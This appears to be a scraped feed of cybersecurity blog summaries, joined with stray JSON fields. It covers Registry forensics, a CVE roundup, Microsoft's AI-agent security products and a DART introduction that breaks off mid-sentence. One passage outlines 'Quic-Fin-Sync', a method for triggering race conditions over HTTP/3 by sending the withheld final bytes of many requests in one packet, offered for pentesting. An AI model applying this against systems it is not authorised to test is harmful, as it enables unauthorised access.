Being somewhat, maybe even only slightly aware of the Windows Registry, I read the post with casual, even mild interest. Someone posted recently that cybersecurity runs on caffeine and sarcasm...I've got my cup of coffee right in front of me, and I've placed the sarcasm in front of us all. ;-) The RegRipper featureusage plugin was originally written in 2019, and includes a reference to a Crowdstrike blog post written in 2020, authored by Jai Minton (who is now with Huntress). The figure to the right was captured from the blog post, and provides a succinct description of how the AppSwitched key is populated. Specifically, Jai stated, \"This key provides the number of times an application switched focus (was left-clicked on the taskbar).\" This helps us understand a bit more about process execution, as for the application to exist on the taskbar and to have it's focus switched, that application has to have been executed. After finding and reading the blog post, I wrote a brief blog post here on this blog that mentioned the Registry key, and referenced Jai's blog post. To Maurice's point, this is, in fact, a valuable artifact, so kudos to Maurice for pointing it out and mentioning it again. If you read through the comments to Maurice's post, there are some hints there as to how to use the value data in your analysis. As you'll note, neither the value names nor the data itself includes a timestamp, but the AppSwitched subkey does have a LastWrite time, and this can be included in a timeline. The value names can be used as pivot points into a timeline, adding something of a \"third dimension\" to timeline analysis. You can use this alongside timestamped information, such as Prefetch entries, Registry data, SRUM DB data, etc.",

      "title": "Unprecedented Complexity",
      "summary": "I saw it again, just today. Another post on social media stating that IT teams/defenders \"face unprecedented complexity\". This one stood out amongst all of the posts proclaiming the need for agentic AI on the defender's side, due to how these agents were currently being employed on the attacker side. We hear things like \"autonomous agents\" being able to bring speed and scale to attacks. I will say that in my experience, defenders are always going to face complexity, but by it's very nature, I would be very reticent to call it \"unprecedented\". The reason for this is that cybersecurity is usually a bolted-on afterthought, one where the infrastructure already exists with a management culture that is completely against any sort of consolidated effort at overall \"control\". Most often, there's no single guiding policy or vision statement, specifically regarding cybersecurity. Many organizations and/or departments may not even fully understand their assets; what endpoints, both physical and virtual, are within their purview? How about applications running on those endpoints? And which of those assets are exposed to the public Internet, or even to access within the infrastructure itself, that don't need to be, or shouldn't be? For example, some applications, such as backup or accounting solutions , will install MSSQL \"under the hood\". Is your IT team aware of this, and if so, have they taken steps to secure this installation? From experience, most don't...the answer to both questions is a resounding \"IDK\". Default installations of MSSQL will send login failure attempts to the Application Event Log, but not successful logins. That only really matters if you're monitoring your logs in some way; many aren't, and even with SIEM solutions, these events are sometimes not included in monitoring. I've seen endpoints with upwards of 45K (yes, you read that right...) failed login attempts to MSSQL recorded in the Application Event Log, but this is most often on systems where the application doesn't rely on the MSSQL installation having hard-coded account credentials. The point is that basic IT hygiene starts with an accurate asset inventory, and is followed with attack surface reduction. Once you know what systems you have, and what applications should/need to be running on those systems, you can begin to address such things as logging configurations, monitoring (SIEM, EDR, etc.), etc. Attack surface reduction adds to increasing the efficacy of your controls, and to minimizing noise from false positives. Not only does this ensure that you're alerted when a security incident does occur, but it also provides for context, *and* it furthers your ability to quickly determine the nature, scope, and origin of the incident. I've seen organizations who are using SIEM, but the Security Event Log on many of their Windows endpoints are not logging either successful logins, nor failed login attempts. This is going to be something of a hot take for many readers, but right now, AI (and specifically agentic AI) is a distraction for defenders. Yes, based on what we're seeing through social media, agentic AI may be furthering threat actors by facilitating faster attacks, at scale, but when it comes right down to it, it's all about the speed and volume; exposure of vulnerable systems remains the same. It's the finding and exploiting the vulnerable systems that's gotten faster. The fact is that for the attacks to be successful, even with speed and scale, vulnerable systems need to be exposed to the Internet, and as such, accessed via some means. Yes, even endpoints not directly exposed to the Internet can be compromised via attacks such as phishing, SEO poisoning, or some other means that tricks the user into installing something that reaches out, but even some of these attacks can be inhibited or even obviated by some simple, free modifications to the endpoint itself.",

The \"so what\" of the article itself has to do with an initial report that states that no malware was present, and two subsequent reports, one of which is from Robert Jan's analysis, stating that malware was found on a USB device. In his LinkedIn post, Robert Jan emphasizes the need for malware scans in a law enforcement environment. Back when I first started working cases, even internally, in the early 2000s, I recommended the same thing, albeit with AV scanners not installed on imaged endpoint. Even more tools are available these days; for example, consider Yara, or something more along the lines of the Thor Scanner from Nextron Systems. To learn a bit more about this man, check out this Forensic Focus interview . Okay, but so what? Why does this matter, or why is it important? When looking to see if malware exists, or did exist on an endpoint, there are different approaches you can take, perhaps using AV scanners, or something like Yara. Or, sometimes, we may not find the actual malware itself, maybe not right away, but we will see clear indications of it's presence, or that it had executed. For example, if you've created a timeline of system activity, you may find a cluster of activity with different components derived from different sources, such as the Registry, Windows Event Log, file system, etc. Separately, these may not be entirely conclusive, but when viewed together, and within a narrow timeframe, they may provide clear indications of something having happened, much like finding footprints, disturbed earth, broken branches, and matted grass following the passage of an animal through a wilderness area. You can even find indications of malware having been or even executed on a system, while the executable itself no longer exists on the endpoint at the time of the investigation. Using sources such as the SRUM DB and/or AmCache.hve and PCA log files may provide valuable insights, even if the malware has been removed from the endpoint. When I was working PCI forensic investigations, our team had found that some of the malware used by the threat actors was based on a \"compiled\" Perl script, used to retrieve credit card numbers from a process memory dump. When run, the program extracted the Perl runtime from the EXE, and placed it in a particular folder path, and each time it was run, the path was slightly different; the final folder name changed. However, using file system metadata, we were able to determine a very explicit timeline of the compromise. Or, we may find indications that an attempt was made to execute the malware, but it failed, either because it was detected and quarantined, or because something caused it to crash. PCA log files and application pop-up/WER messages in the Application Event Log have proved to be very illuminating on some of the cases with which I've engaged. The key to all of this is to document your analysis process; if you don't know what you did, you can't make modifications or adjustments to the process. For example, if you have a memory dump, how did you go about searching for indications of a specific IP address? Volatility? Bulk_extractor? Don't remember/don't know? If you mounted the image and scanned it with AV, which one/version did you use? Knowing what you did, and what you found, means that you can then make adjustments and improvements to the process over time.",

      "title": "The Week in Vulnerabilities: Cyble Urges Fortinet, Microsoft Fixes",
      "summary": "Cyble Vulnerability Intelligence researchers tracked 826 vulnerabilities in the last week, and more than 130 of the disclosed vulnerabilities already have a publicly available Proof-of-Concept (PoC), significantly increasing the likelihood of real-world attacks on those vulnerabilities. A total of 81 vulnerabilities were rated as critical under the CVSS v3.1 scoring system, while 12 received a critical severity rating based on the newer CVSS v4.0 scoring system. What follows are 15 IT and ICS vulnerabilities flagged by Cyble threat intelligence researchers as meriting high-priority attention by security teams, including seven vulnerabilities under discussion by threat actors on the dark web. The Week\u2019s Top IT Vulnerabilities CVE-2025-59367 is an authentication bypass vulnerability identified in certain ASUS DSL series routers. The flaw could potentially allow remote attackers to gain unauthorized access to affected systems without requiring any privileges or user interaction. CVE-2025-62215 is a race condition vulnerability in the Windows Kernel caused by improper synchronization when multiple threads access shared kernel resources concurrently. The flaw could allow an authorized local attacker to escalate privileges to the SYSTEM level by exploiting this race condition. The vulnerability has been added to CISA\u2019s Known Exploited Vulnerabilities (KEV) catalog. CVE-2025-64446 is a critical path traversal vulnerability in Fortinet FortiWeb, a web application firewall used to protect web applications. The vulnerability has been actively exploited in the wild since at least early October 2025, allowing unauthenticated remote attackers to create unauthorized administrative accounts on vulnerable devices by sending crafted HTTP POST requests that exploit relative path traversal. It also has been added to the CISA KEV catalog. CVE-2025-58034 is a high-severity OS command injection vulnerability in Fortinet FortiWeb. The flaw could allow an authenticated attacker to execute unauthorized operating system commands through crafted HTTP requests or CLI commands. The vulnerability has also been added to the CISA KEV catalog. CVE-2025-11001 is a high-severity remote code execution (RCE) vulnerability in the popular file archiving software 7-Zip. It arises from a flaw in the way 7-Zip parses ZIP file directories, potentially allowing an attacker to craft a malicious archive that triggers a directory traversal. Proof-of-concept exploits have been publicly released, making it easier for attackers to weaponize. Vulnerabilities Under Discussion on the Dark Web Cyble dark web researchers observed threat actors on underground and cybercrime forums discussing weaponizing several vulnerabilities, among them: CVE-2025-64495 : A high-severity stored DOM-based Cross-Site Scripting (XSS) vulnerability in Open WebUI, a self-hosted artificial intelligence platform, affecting versions 0.6.34 and below. The vulnerability exists in the chat window's prompt insertion feature, where user-controlled HTML from custom prompts is assigned directly to the DOM sink .innerHTML without proper sanitization when the \"Insert Prompt as Rich Text\" setting is enabled. While the marked library is used to parse the content, it does not sanitize HTML, potentially allowing attackers with low-level privileges to create malicious prompts containing JavaScript payloads that execute when other users insert those prompts via slash commands. CVE-2025-60710 : A high-severity local privilege escalation vulnerability in the Host Process for Windows Tasks affecting Microsoft Windows 11 Version 25H2 (build 10.0.26200.0). The vulnerability involves improper link resolution before file access. The flaw potentially allows an authorized attacker with limited local privileges to exploit improper handling of symbolic links or junction points in the Host Process for Windows Tasks, redirecting file operations to unintended locations and escalating their privileges. CVE-2025-26686 : A Windows TCP/IP remote code execution (RCE) vulnerability caused by sensitive data being stored in improperly locked memory, potentially allowing a network attacker to execute arbitrary code when specific network traffic (notably DHCPv6) is processed on affected Windows systems. CVE-2025-10230 : A 10.0-severity unauthenticated remote command execution vulnerability in Samba\u2019s WINS \u201cwins hook\u201d handling on Active Directory Domain Controllers, exploitable over the network with no user interaction when a specific, legacy WINS configuration is enabled. CVE-2025-12101 : A medium-severity reflected cross-site scripting (XSS) vulnerability in Citrix NetScaler ADC and NetScaler Gateway when configured as a Gateway or AAA virtual server, affecting SSO flows and potentially allowing attacker-controlled JavaScript execution in a victim\u2019s browser. CVE-2025-59118 : A high-severity unrestricted file upload vulnerability in Apache OFBiz before 24.09.03 that can be leveraged for unauthenticated remote code execution on affected servers. The flaw potentially allows a remote attacker to upload arbitrary files of dangerous types (for example, scripts or binaries) because OFBiz does not properly restrict or validate uploaded content in the vulnerable path. CVE-2025-21042 : A high-severity out\u2011of\u2011bounds write vulnerability in Samsung\u2019s libimagecodec.quram.so image\u2011processing library that allows remote, often zero\u2011click, arbitrary code execution on affected Galaxy devices and has been exploited in the wild to deploy the LANDFALL Android spyware . ICS Vulnerabilities Cyble threat intelligence researchers also flagged three industrial control system (ICS) vulnerabilities as meriting high-priority attention by security teams. CVE-2025-58083 affects the General Industrial Controls Lynx+ Gateway, an industrial protocol converter and gateway device designed to connect and enable seamless communication between different industrial network devices. The embedded web server of this device lacks essential authentication protection for critical functions, potentially allowing an unauthenticated remote attacker to reset the device without user interaction. CVE-2025-11862 is an Incorrect Authorization vulnerability in multiple versions of Rockwell Automation Verve Asset Manager. Successful exploitation of this vulnerability could allow an attacker to access or alter user data. CVE-2025-41733 is an Authentication Bypass vulnerability affecting multiple versions of METZ CONNECT EWIO2. Successful exploitation could allow an attacker to bypass authentication and remotely control the device or execute remote code. Conclusion The high number of critical and exploited vulnerabilities in this week\u2019s report underscores the ever-present threats facing security teams, who must respond with rapid, well-targeted actions to successfully defend IT and critical infrastructure. A risk-based vulnerability management program should be at the heart of those defensive efforts. Other cybersecurity best practices that can help guard against a wide range of threats include segmentation of critical assets; removing or protecting web-facing assets; Zero-Trust access principles; ransomware -resistant backups; hardened endpoints, infrastructure, and configurations; network, endpoint , and cloud monitoring; and well-rehearsed incident response plans. Cyble\u2019s comprehensive attack surface management solutions can help by scanning network and cloud assets for exposures and prioritizing fixes, in addition to monitoring for leaked credentials and other early warning signs of major cyberattacks .

The issue is that QUIC is designed to prevent network bottlenecks (HOL blocking), which is beneficial, but it disrupts the fundamental timing required for exploiting application-level race conditions. We tried all the obvious solutions, but QUIC's RFC essentially blocks fragmentation and other low-level network optimizations. \ud83e\udd37\u200d\u2642\ufe0f So, we figured out a way to synchronize things at the QUIC stream layer using a technique we call Quic-Fin-Sync . The gist: Set up 100+ requests, but hold back the absolute last byte of data for each one. The server gets 99.9% of the data but waits for that last byte. We send the final byte (and the crucial QUIC FIN flag) for all 100+ requests in one single UDP packet . This one packet forces the server to \"release\" all the requests into processing near-simultaneously. It worked way better than existing methods in our tests\u2014we successfully raced a vulnerable Keycloak setup over 40 times. If you are pentesting HTTP/3, grab the open-source tool and let us know what you break with it. The full write-up is below.

      "title": "Security as the core primitive - Securing AI agents and apps",
      "summary": "This week at Microsoft Ignite, we shared our vision for Microsoft security -- In the agentic era, security must be ambient and autonomous, like the AI it protects. It must be woven into and around everything we build\u2014from silicon to OS, to agents, apps, data, platforms, and clouds\u2014and throughout everything we do. In this blog, we are going to dive deeper into many of the new innovations we are introducing this week to secure AI agents and apps. As I spend time with our customers and partners, there are four consistent themes that have emerged as core security challenges to secure AI workloads. These are: preventing agent sprawl and access to resources, protecting against data oversharing and data leaks, defending against new AI threats and vulnerabilities, and adhering to evolving regulations. Addressing these challenges holistically requires a coordinated effort across IT, developers, and security leaders, not just within security teams and to enable this, we are introducing several new innovations: Microsoft Agent 365 for IT, Foundry Control Plane in Microsoft Foundry for developers, and the Security Dashboard for AI for security leaders. In addition, we are releasing several new purpose-built capabilities to protect and govern AI apps and agents across Microsoft Defender, Microsoft Entra, and Microsoft Purview. Observability at every layer of the stack To facilitate the organization-wide effort that it takes to secure and govern AI agents and apps \u2013 IT, developers, and security leaders need observability (security, management, and monitoring) at every level. IT teams need to enable the development and deployment of any agent in their environment. To ensure the responsible and secure deployment of agents into an organization, IT needs a unified agent registry, the ability to assign an identity to every agent, manage the agent\u2019s access to data and resources, and manage the agent\u2019s entire lifecycle. In addition, IT needs to be able to assign access to common productivity and collaboration tools, such as email and file storage, and be able to observe their entire agent estate for risks such as over-permissioned agents. Development teams need to build and test agents, apply security and compliance controls by default, and ensure AI models are evaluated for safety guardrails and security vulnerabilities. Post deployment, development teams must observe agents to ensure they are staying on task, accessing applications and data sources appropriately, and operating within their cost and performance expectations. Security & compliance teams must ensure overall security of their AI estate, including their AI infrastructure, platforms, data, apps, and agents. They need comprehensive visibility into all their security risks- including agent sprawl and resource access, data oversharing and leaks, AI threats and vulnerabilities, and complying with global regulations. They want to address these risks by extending their existing security investments that they are already invested in and familiar with, rather than using siloed or bolt-on tools. These teams can be most effective in delivering trustworthy AI to their organizations if security is natively integrated into the tools and platforms that they use every day, and if those tools and platforms share consistent security primitives such as agent identities from Entra; data security and compliance controls from Purview; and security posture, detections, and protections from Defender. With the new capabilities being released today, we are delivering observability at every layer of the AI stack, meeting IT, developers, and security teams where they are in the tools they already use to innovate with confidence. Figure 1: Delivering observability for every role For IT Teams - Introducing Microsoft Agent 365, the control plane for agents, now in preview The best infrastructure for managing your agents is the one you already use to manage your users. With Agent 365, organizations can extend familiar tools and policies to confidently deploy and secure agents, without reinventing the wheel. By using the same trusted Microsoft 365 infrastructure, productivity apps, and protections, organizations can now apply consistent and familiar governance and security controls that are purpose-built to protect against agent-specific threats and risks. Figure 2: Agent 365 provides IT admins with a unified dashboard in the Microsoft 365 admin center, offering a central view of agent inventory, platforms, active users, and recommended actions to simplify management and governance of agents across organizations Microsoft Agent 365 delivers a unified agent Registry , Access Control , Visualization , Interoperability , and Security capabilities for your organization. These capabilities work together to help organizations manage agents and drive business value. The Registry powered by the Entra provides a complete and unified inventory of all the agents deployed and used in your organization including both Microsoft and third-party agents. Access Control allows you to limit the access privileges of your agents to only the resources that they need and protect their access to resources in real time. Visualization gives organizations the ability to see what matters most and gain insights through a unified dashboard, advanced analytics, and role-based reporting. Interop allows agents to access organizational data through Work IQ for added context, and to integrate with Microsoft 365 apps such as Outlook, Word, and Excel so they can create and collaborate alongside users. Security enables the proactive detection of vulnerabilities and misconfigurations, protects against common attacks such as prompt injections, prevents agents from processing or leaking sensitive data, and gives organizations the ability to audit agent interactions, assess compliance readiness and policy violations, and recommend controls for evolving regulatory requirements. Figure 3: Control plane for agents Microsoft Agent 365 also includes the Agent 365 SDK, part of Microsoft Agent Framework, which empowers developers and ISVs to build agents on their own AI stack. The SDK enables agents to automatically inherit Microsoft's security and governance protections, such as identity controls, data security policies, and compliance capabilities, without the need for custom integration. For more details on Agent 365, read the blog here. For Developers - Introducing Microsoft Foundry Control Plane to observe, secure and manage agents, now in preview Developers are moving fast to bring agents into production, but operating them at scale introduces new challenges and responsibilities. Agents can access tools, take actions, and make decisions in real time, which means development teams must ensure that every agent behaves safely, securely, and consistently. Today, developers need to work across multiple disparate tools to get a holistic picture of the cybersecurity and safety risks that their agents may have. Once they understand the risk, they then need a unified and simplified way to monitor and manage their entire agent fleet and apply controls and guardrails as needed. Microsoft Foundry provides a unified platform for developers to build, evaluate and deploy AI apps and agents in a responsible way. Today we are excited to announce that Foundry Control Plane is available in preview. This enables developers to observe, secure, and manage their agent fleets with built-in security, and centralized governance controls. With this unified approach, developers can now identify risks and correlate disparate signals across their models, agents, and tools; enforce consistent policies and quality gates; and continuously monitor task adherence and runtime risks. Foundry Control Plane is deeply integrated with Microsoft\u2019s security portfolio to provide a \u2018secure by design\u2019 foundation for developers. With Microsoft Entra , developers can ensure an agent identity (Agent ID) and access controls are built into every agent, mitigating the risk of unmanaged agents and over permissioned resources. With Microsoft Defender built in, developers gain contextualized alerts and posture recommendations for agents directly within the Foundry Control Plane. This integration proactively prevents configuration and access risks, while also defending agents from runtime threats in real time. Microsoft Purview\u2019s native integration into Foundry Control Plane makes it easy to enable data security and compliance for every Foundry-built application or agent. This allows Purview to discover data security and compliance risks and apply policies to prevent user prompts and AI responses from safety and policy violations. In addition, agent interactions can be logged and searched for compliance and legal audits. This integration of the shared security capabilities, including identity and access, data security and compliance, and threat protection and posture ensures that security is not an afterthought; it\u2019s embedded at every stage of the agent lifecycle, enabling you to start secure and stay secure. Figure 4: Foundry Control Plane gives developers a unified dashboard with real-time threat alerts from Microsoft Defender, data protection and governance via Microsoft Purview, and secure agent identity and access through Microsoft Entra For more details, read the blog . For Security Teams - Introducing Security Dashboard for AI - unified risk visibility for CISOs and AI risk leaders, coming soon AI proliferation in the enterprise, combined with the emergence of AI governance committees and evolving AI regulations, leaves CISOs and AI risk leaders needing a clear view of their AI risks, such as data leaks, model vulnerabilities, misconfigurations, and unethical agent actions across their entire AI estate, spanning AI platforms, apps, and agents. 90% of security professionals, including CISOs, report that their responsibilities have expanded to include data governance and AI oversight within the past year. 1 At the same time, 86% of risk managers say disconnected data and systems lead to duplicated efforts and gaps in risk coverage. 2 To address these needs, we are excited to introduce the Security Dashboard for AI. This serves as a unified dashboard that aggregates posture and real-time risk signals from Microsoft Defender, Microsoft Entra, and Microsoft Purview. This unified dashboard allows CISOs and AI risk leaders to discover agents and AI apps, track AI posture and drift, and correlate risk signals to investigate and act across their entire AI ecosystem. For example, you can see your full AI inventory and get visibility into a quarantined agent, flagged for high data risk due to oversharing sensitive information in Purview. The dashboard then correlates that signal with identity insights from Entra and threat protection alerts from Defender to provide a complete picture of exposure. From there, you can delegate tasks to the appropriate teams to enforce policies and remediate issues quickly. With the Security Dashboard for AI, CISOs and risk leaders gain a clear, consolidated view of AI risks across agents, apps, and platforms\u2014eliminating fragmented visibility, disconnected posture insights, and governance gaps as AI adoption scales. Best of all, there\u2019s nothing new to buy. If you\u2019re already using Microsoft security products to secure AI, you\u2019re already a Security Dashboard for AI customer. Figure 5: Security Dashboard for AI provides CISOs and AI risk leaders with a unified view of their AI risk by bringing together their AI inventory, AI risk, and security recommendations to strengthen overall posture Together, these innovations deliver observability and security across IT, development, and security teams, powered by Microsoft\u2019s shared security capabilities. With Microsoft Agent 365 , IT teams can manage and secure agents alongside users. Foundry Control Plane gives developers unified governance and lifecycle controls for agent fleets. Security Dashboard for AI provides CISOs and AI risk leaders with a consolidated view of AI risks across platforms, apps, and agents. Added innovation to secure and govern your AI workloads In addition to the IT, developer, and security leader-focused innovations outlined above, we continue to accelerate our pace of innovation in Microsoft Entra, Microsoft Purview, and Microsoft Defender to address the most pressing needs for securing and governing your AI workloads. These needs are: Manage agent sprawl and resource access e.g. managing agent identity, access to resources, and permissions lifecycle at scale Prevent data oversharing and leaks e.g. protecting sensitive information shared in prompts, responses, and agent interactions Defend against shadow AI, new threats, and vulnerabilities e.g. managing unsanctioned applications, preventing prompt injection attacks, and detecting AI supply chain vulnerabilities Enable AI governance for regulatory compliance e.g. ensuring AI development, operations, and usage comply with evolving global regulations and frameworks Manage agent sprawl and resource access 76% of business leaders expect employees to manage agents within the next 2\u20133 years. 3 Widespread adoption of agents is driving the need for visibility and control, which includes the need for a unified registry, agent identities, lifecycle governance, and secure access to resources. Today, Microsoft Entra provides robust identity protection and secure access for applications and users. However, organizations lack a unified way to manage, govern, and protect agents in the same way they manage their users. Organizations need a purpose-built identity and access framework for agents. Introducing Microsoft Entra Agent ID, now in preview Microsoft Entra Agent ID offers enterprise-grade capabilities that enable organizations to prevent agent sprawl and protect agent identities and their access to resources. These new purpose-built capabilities enable organizations to: Register and manage agents: Get a complete inventory of the agent fleet and ensure all new agents are created with an identity built-in and are automatically protected by organization policies to accelerate adoption. Govern agent identities and lifecycle: Keep the agent fleet under control with lifecycle management and IT-defined guardrails for both agents and people who create and manage them. Protect agent access to resources: Reduce risk of breaches, block risky agents, and prevent agent access to malicious resources with conditional access and traffic inspection. Agents built in Microsoft Copilot Studio, Microsoft Foundry, and Security Copilot get an Entra Agent ID built-in at creation. Developers can also adopt Entra Agent ID for agents they build through Microsoft Agent Framework, Microsoft Agent 365 SDK, or Microsoft Entra Agent ID SDK. Figure 6: Microsoft Entra Agent ID offers a central overview of agent identities, with detailed insights into unprotected, classified, and recently created agents Read the Microsoft Entra blog to learn more. Prevent data oversharing and leaks Data security is more complex than ever. Information Security Media Group (ISMG) reports that 80% of leaders cite leakage of sensitive data as their top concern. 4 In addition to data security and compliance risks of generative AI (GenAI) apps, agents introduces new data risks such as unsupervised data access, highlighting the need to protect all types of corporate data, whether it is accessed by employees or agents. To mitigate these risks, we are introducing new Microsoft Purview data security and compliance capabilities for Microsoft 365 Copilot and for agents and AI apps built with Copilot Studio and Microsoft Foundry, providing unified protection, visibility, and control for users, AI Apps, and Agents. New Microsoft Purview controls safeguard Microsoft 365 Copilot with real-time protection and bulk remediation of oversharing risks Microsoft Purview and Microsoft 365 Copilot deliver a fully integrated solution for protecting sensitive data in AI workflows. Based on ongoing customer feedback, we\u2019re introducing new capabilities to deliver real-time protection for sensitive data in M365 Copilot and accelerated remediation of oversharing risks: Data risk assessments: Previously, admins could monitor oversharing risks such as SharePoint sites with unprotected sensitive data. Now, they can perform item-level investigations and bulk remediation for overshared files in SharePoint and OneDrive to quickly reduce oversharing exposure. Data Loss Prevention (DLP) for M365 Copilot: DLP previously excluded files with sensitivity labels from Copilot processing. Now in preview, DLP also prevents prompts that include sensitive data from being processed in M365 Copilot, Copilot Chat, and Copilot agents, and prevents Copilot from using sensitive data in prompts for web grounding. Priority cleanup for M365 Copilot assets: Many organizations have org-wide policies to retain or delete data. Priority cleanup, now generally available, lets admins delete assets that are frequently processed by Copilot, such as meeting transcripts and recordings, on an independent schedule from the org-wide policies while maintaining regulatory compliance. On-demand classification for meeting transcripts: Purview can now detect sensitive information in meeting transcripts on-demand. This enables data security admins to apply DLP policies and enforce Priority cleanup based on the sensitive information detected. Figure 7: Expanded Data risks assessments with item-level investigation & bulk remediation Read the full Data Security blog to learn more. I ntroducing new Microsoft Purview data security capabilities for agents and apps built with Copilot Studio and Microsoft Foundry, now in preview Microsoft Purview now extends the same data security and compliance for users and Copilots to agents and apps. These new capabilities are: Enhanced Data Security Posture Management: A centralized DSPM dashboard that provides observability, risk assessment, and guided remediation across users, AI apps, and agents. Insider Risk Management (IRM) for Agents: Uniquely designed for agents, using dedicated behavioral analytics, Purview dynamically assigns risk levels to agents based on their risky handing of sensitive data and enables admins to apply conditional policies based on that risk level. Sensitive data protection with Azure AI Search: Azure AI Search enables fast, AI-driven retrieval across large document collections, essential for building AI Apps. When apps or agents use Azure AI Search to index or retrieve data, Purview sensitivity labels are preserved in the search index, ensuring that any sensitive information remains protected under the organization\u2019s data security & compliance policies. Figure 8: DSPM helps strengthen data security posture for agents across environments For more information on preventing data oversharing and data leaks - Learn how Purview protects and governs agents in the Data Security and Compliance for Agents blog. Defend against shadow AI, new threats, and vulnerabilities AI workloads are subject to new AI-specific threats like prompt injections attacks, model poisoning, and data exfiltration of AI generated content. Although security admins and SOC analysts have similar tasks when securing agents, the attack methods and surfaces differ significantly. To help customers defend against these novel attacks, we are introducing new capabilities in Microsoft Defender that deliver end-to-end protection, from security posture management to runtime defense. Introducing Security Posture Management for agents, now in preview As organizations adopt AI agents to automate critical workflows, they become high-value targets and potential points of compromise, creating a critical need to ensure agents are hardened, compliant, and resilient by preventing misconfigurations and safeguarding against adversarial manipulation. Security Posture Management for agents in Microsoft Defender now provides an agent inventory for security teams across Microsoft Foundry and Copilot Studio agents. Here, analysts can assess the overall security posture of an agent, easily implement security recommendations, and identify vulnerabilities such as misconfigurations and excessive permissions, all aligned to the MITRE ATT&CK framework. Additionally, the new agent attack path analysis visualizes how an agent\u2019s weak security posture can create broader organizational risk, so you can quickly limit exposure and prevent lateral movement. Figure 9: Microsoft Defender conducts a comprehensive attack path analysis for agents to help teams prioritize mitigation before breaches occur Introducing Threat Protection for agents, now in preview Attack techniques and attack surfaces for agents are fundamentally different from other assets in your environment. That\u2019s why Defender is delivering purpose-built protections and detections to help defend against them. Defender is introducing runtime protection for Copilot Studio agents that automatically block prompt injection attacks in real time. In addition, we are announcing agent-specific threat detections for Copilot Studio and Microsoft Foundry agents coming soon. Defender automatically correlates these alerts with Microsoft\u2019s industry-leading threat intelligence and cross-domain security signals to deliver richer, contextualized alerts and security incident views for the SOC analyst. Defender\u2019s risk and threat signals are natively integrated into the new Microsoft Foundry Control Plane, giving development teams full observability and the ability to act directly from within their familiar environment. Finally, security analysts will be able to hunt across all agent telemetry in the Advanced Hunting experience in Defender, and the new Agent 365 SDK extends Defender\u2019s visibility and hunting capabilities to third-party agents, starting with Genspark and Kasisto, giving security teams even more coverage across their AI landscape. Figure 10: Microsoft Defender now correlates agent alerts with other threat signals To learn more about how you can harden the security posture of your agents and defend against threats, read the Microsoft Defender blog. Enable AI governance for regulatory compliance Global AI regulations like the EU AI Act and NIST AI RMF are evolving rapidly; yet, according to ISMG, 55% of leaders report lacking clarity on current and future AI regulatory requirements. 5 As enterprises adopt AI, they must ensure that their AI innovation aligns with global regulations and standards to avoid costly compliance gaps. Introducing new Microsoft Purview Compliance Manager capabilities to stay ahead of evolving AI regulations, now in preview Today, Purview Compliance Manager provides over 300 pre-built assessments for common industry, regional, and global standards and regulations. However, the pace of change for new AI regulations requires controls to be continuously re-evaluated and updated so that organizations can adapt to ongoing changes in regulations and stay compliant. To address this need, Compliance Manager now includes AI-powered regulatory templates . AI-powered regulatory templates enable real-time ingestion and analysis of global regulatory documents, allowing compliance teams to quickly adapt to changes as they happen. As regulations evolve, the updated regulatory documents can be uploaded to Compliance Manager, and the new requirements are automatically mapped to applicable recommended actions to implement controls across Microsoft Defender, Microsoft Entra, Microsoft Purview, Microsoft 365, and Microsoft Foundry. Automated actions by Compliance Manager further streamline governance, reduce manual workload, and strengthen regulatory accountability. Figure 11: AI-powered regulatory templates scan uploaded regulatory documents, extract key requirements, and map them to the right controls in your Microsoft products Introducing expanded Microsoft Purview compliance capabilities for agents and AI apps now in preview Microsoft Purview now extends its compliance capabilities across agent-generated interactions, ensuring responsible use and regulatory alignment as AI becomes deeply embedded across business processes. New capabilities include expanded coverage for: Audit: Surface agent interactions, lifecycle events, and data usage with Purview Audit. Unified audit logs across user and agent activities, paired with traceability for every agent using an Entra Agent ID, support investigation, anomaly detection, and regulatory reporting. Communication Compliance: Detect prompts sent to agents and agent-generated responses containing inappropriate, unethical, or risky language, including attempts to manipulate agents into bypassing policies, generating risky content, or producing noncompliant outputs. When issues arise, data security admins get full context, including the prompt, the agent\u2019s output, and relevant metadata, so they can investigate and take corrective action Data Lifecycle Management: Apply retention and deletion policies to agent-generated content and communication flows to automate lifecycle controls and reduce regulatory risk. Figure 12: Communication Compliance detects policy and ethical violations in agent interactions so admins can take appropriate action. Read about Microsoft Purview data security for agents to learn more. Finally, we are extending our data security, threat protection, and identity access capabilities to third-party apps and agents via the network. Advancing Microsoft Entra Internet Access Secure Web + AI Gateway - extend runtime protections to the network, now in preview Microsoft Entra Internet Access, part of the Microsoft Entra Suite, has new capabilities to secure access to and usage of GenAI at the network level, marking a transition from Secure Web Gateway to Secure Web and AI Gateway. Enterprises can accelerate GenAI adoption while maintaining compliance and reducing risk, empowering employees to experiment with new AI tools safely. The new capabilities include: Prompt injection protection which blocks malicious prompts in real time by extending Azure AI Prompt Shields to the network layer. Network file filtering which extends Microsoft Purview to inspect files in transit and prevents regulated or confidential data from being uploaded to unsanctioned AI services. Shadow AI Detection that provides visibility into unsanctioned AI applications through Cloud Application Analytics and Defender for Cloud Apps risk scoring, empowering security teams to monitor usage trends, apply Conditional Access, or block high-risk apps instantly. Unsanctioned MCP server blocking prevents access to MCP servers from unauthorized agents. With these controls, you can accelerate GenAI adoption while maintaining compliance and reducing risk, so employees can experiment with new AI tools safely. Figure 13: Microsoft Entra Internet Access prevents sensitive data leaks to unsanctioned apps Read the Microsoft Entra blog to learn more.

      "title": "Meet DART, the people behind Microsoft Incident Response",
      "summary": "When threat actors infiltrate a company to steal documents and other critical business information, Microsoft Incident Response - the Detection and Response Team (DART) responds. With more than 4,500 engagements in 2024 and more than a millennium of combined experience, these responders are the calm in the storm when a compromise occurs. Whether they\u2019re confronting ransomware, nation-state actors, or zero-day exploits, DART blends their knowledge and years of experience with agility, empathy, and storytelling to guide organizations from disruption to clarity. This blog introduces the people behind DART, which includes forensic analysts, infrastructure specialists, and threat hunters whose mission is to contain attacks, restore trust, and build resilience for the future. DART DART isn\u2019t just a lifeline during a crisis, they\u2019re strategic partners in building cyber resilience before threat actors strike. Through a suite of proactive services, the team helps organizations identify vulnerabilities, harden critical systems, and prepare for the unexpected. Proactive offerings like compromise assessments, identity reviews, and threat briefings allow customers to uncover hidden risks and receive tailored recommendations without the pressure of an active breach. By leveraging Microsoft\u2019s vast threat intelligence and engineering access, organizations gain insights into emerging tactics and trends, ensuring their security posture evolves ahead of the threat landscape. In short, DART empowers defenders to out-think threat actors by mapping potential pathways, closing gaps, and rehearsing responses - so when the real thing happens, they\u2019re ready. Cyber Frontier: Real-World Insights from Microsoft & DART The cyber threat landscape is constantly evolving, forcing defenders to rethink traditional security models. The past year, DART has observed shifts in tactics driven by the rise of AI and the relentless 